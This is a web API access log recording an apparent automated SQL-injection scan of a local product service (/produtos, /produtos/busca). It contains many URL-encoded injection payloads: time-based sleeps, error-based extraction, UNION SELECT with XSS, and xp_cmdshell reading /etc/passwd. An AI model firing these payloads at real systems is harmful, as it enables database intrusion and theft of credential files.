api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:47410 - "GET /produtos/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/2842/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29gGKK%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47422 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/2842/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29gGKK%29/%2A%2A/AND/%2A%2A/%28%27gJwY%27%3D%27gJwY HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47430 - "GET /produtos%27/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/2842/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29gGKK%29/%2A%2A/AND/%2A%2A/%27eUIK%27%3D%27eUIK HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47436 - "GET /produtos/%2A%2A/AND/%2A%2A/%28SELECT/%2A%2A/2842/%2A%2A/FROM/%2A%2A/%28SELECT%28SLEEP%285%29%29%29gGKK%29--/%2A%2A/tNBJ HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47452 - "GET /produtos%29/%2A%2A/AND/%2A%2A/8860%3D%28SELECT/%2A%2A/8860/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%285501%3D5501 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47458 - "GET /produtos/%2A%2A/AND/%2A%2A/8860%3D%28SELECT/%2A%2A/8860/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47466 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/8860%3D%28SELECT/%2A%2A/8860/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%28%27PqvR%27%3D%27PqvR HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47450 - "GET /produtos%27/%2A%2A/AND/%2A%2A/8860%3D%28SELECT/%2A%2A/8860/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%27FHWH%27%3D%27FHWH HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47472 - "GET /produtos/%2A%2A/AND/%2A%2A/8860%3D%28SELECT/%2A%2A/8860/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29--/%2A%2A/UQCQ HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47500 - "GET /produtos%29/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%287648%3D7648 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47486 - "GET /produtos/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47506 - "GET /produtos%27%29/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%28%27tXgF%27%3D%27tXgF HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47508 - "GET /produtos%27/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%27cQdP%27%3D%27cQdP HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47512 - "GET /produtos/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27--/%2A%2A/Ptsk HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47520 - "GET /produtos%29/%2A%2A/AND/%2A%2A/8557%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28111%29%7C%7CCHR%2880%29%7C%7CCHR%2880%29%7C%7CCHR%28103%29%2C5%29/%2A%2A/AND/%2A%2A/%283645%3D3645 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47528 - "GET /produtos/%2A%2A/AND/%2A%2A/8557%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28111%29%7C%7CCHR%2880%29%7C%7CCHR%2880%29%7C%7CCHR%28103%29%2C5%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47534 - "GET /produtos%27%29/%2A%2A/AND/%2A%2A/8557%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28111%29%7C%7CCHR%2880%29%7C%7CCHR%2880%29%7C%7CCHR%28103%29%2C5%29/%2A%2A/AND/%2A%2A/%28%27hbio%27%3D%27hbio HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47544 - "GET /produtos%27/%2A%2A/AND/%2A%2A/8557%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28111%29%7C%7CCHR%2880%29%7C%7CCHR%2880%29%7C%7CCHR%28103%29%2C5%29/%2A%2A/AND/%2A%2A/%27KxvI%27%3D%27KxvI HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47546 - "GET /produtos/%2A%2A/AND/%2A%2A/8557%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28111%29%7C%7CCHR%2880%29%7C%7CCHR%2880%29%7C%7CCHR%28103%29%2C5%29--/%2A%2A/gIwR HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47516 - "GET /produtos%29/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/EFXI HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47562 - "GET /produtos/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/dJUe HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47578 - "GET /produtos%27%29/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/bYaS HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47582 - "GET /produtos%27/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/tEYH HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47590 - "GET /produtos/%2A%2A/ORDER/%2A%2A/BY/%2A%2A/1--/%2A%2A/RiTG HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47612 - "POST /produtos HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:47628 - "POST /produtos?QmEb=5799%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:47638 - "POST /produtos HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:47646 - "GET /produtos/1 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:47648 - "PUT /produtos/1 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:47650 - "PUT /produtos/1?GDME=8813%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:47664 - "PUT /produtos/1 HTTP/1.1" 422 Unprocessable Entity
api-1  | INFO:     172.18.0.1:48870 - "GET /produtos/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:48878 - "GET /produtos/busca/?nome=teste&SyWd=7040%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:48880 - "GET /produtos/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:48882 - "GET /produtos/busca/?nome=8181 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:48896 - "GET /produtos/busca/?nome=teste..%29%28%27.%29%2C%22%29 HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:48898 - "GET /produtos/busca/?nome=teste%27qxAHMO%3C%27%22%3EBILzmb HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:48914 - "GET /produtos/busca/?nome=teste HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:48928 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7312%3D4000%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27PzTm%27%3D%27PzTm HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:48938 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F3396%3D3396%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27kzem%27%3D%27kzem HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:48954 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F2277%3D8829%2F%2A%2A%2FAND%2F%2A%2A%2F%27Adlx%27%3D%27Adlx HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:48950 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F3396%3D3396%2F%2A%2A%2FAND%2F%2A%2A%2F%27rJyq%27%3D%27rJyq HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:48956 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F1000%3D4453%2F%2A%2A%2FAND%2F%2A%2A%2F%287093%3D7093 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:48964 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F3396%3D3396%2F%2A%2A%2FAND%2F%2A%2A%2F%285230%3D5230 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:48972 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9376%3D2508 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:48988 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3396%3D3396 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:48994 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1270%3D9571--%2F%2A%2A%2FZOHm HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49010 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3396%3D3396--%2F%2A%2A%2FhnNc HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49016 - "GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%288192%3D9551%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F9551%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1410%29%2F%2A%2A%2FEND%29%29 HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49018 - "GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284017%3D4017%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5961%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F6100%29%2F%2A%2A%2FEND%29%29 HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49026 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283597%2CCONCAT%280x5c%2C0x71716b7a71%2C%28SELECT%2F%2A%2A%2F%28ELT%283597%3D3597%2C1%29%29%29%2C0x7176707071%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27HfAQ%27%3D%27HfAQ HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49030 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283597%2CCONCAT%280x5c%2C0x71716b7a71%2C%28SELECT%2F%2A%2A%2F%28ELT%283597%3D3597%2C1%29%29%29%2C0x7176707071%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27gFmA%27%3D%27gFmA HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49036 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283597%2CCONCAT%280x5c%2C0x71716b7a71%2C%28SELECT%2F%2A%2A%2F%28ELT%283597%3D3597%2C1%29%29%29%2C0x7176707071%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%289375%3D9375 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49040 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283597%2CCONCAT%280x5c%2C0x71716b7a71%2C%28SELECT%2F%2A%2A%2F%28ELT%283597%3D3597%2C1%29%29%29%2C0x7176707071%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49052 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%283597%2CCONCAT%280x5c%2C0x71716b7a71%2C%28SELECT%2F%2A%2A%2F%28ELT%283597%3D3597%2C1%29%29%29%2C0x7176707071%29%29--%2F%2A%2A%2FDLdN HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49068 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5666%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285666%3D5666%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27AKXC%27%3D%27AKXC HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49070 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F5666%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285666%3D5666%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27TbIJ%27%3D%27TbIJ HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49084 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F5666%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285666%3D5666%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288169%3D8169 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49092 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5666%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285666%3D5666%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49104 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5666%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285666%3D5666%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FOZud HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49120 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F5214%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285214%3D5214%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27JuyD%27%3D%27JuyD HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49110 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F5214%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285214%3D5214%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27kFaa%27%3D%27kFaa HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49128 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F5214%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285214%3D5214%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%284522%3D4522 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49142 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5214%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285214%3D5214%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49144 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F5214%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28122%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%285214%3D5214%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28112%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FAnpx HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49148 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F9771%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289771%3D9771%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27KUYL%27%3D%27KUYL HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49152 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F9771%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289771%3D9771%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27ZZPE%27%3D%27ZZPE HTTP/1.1" 500 Internal Server Error
api-1  | INFO:     172.18.0.1:49162 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F9771%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289771%3D9771%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%281307%3D1307 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:49174 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9771%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289771%3D9771%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29 HTTP/1.1" 200 OK
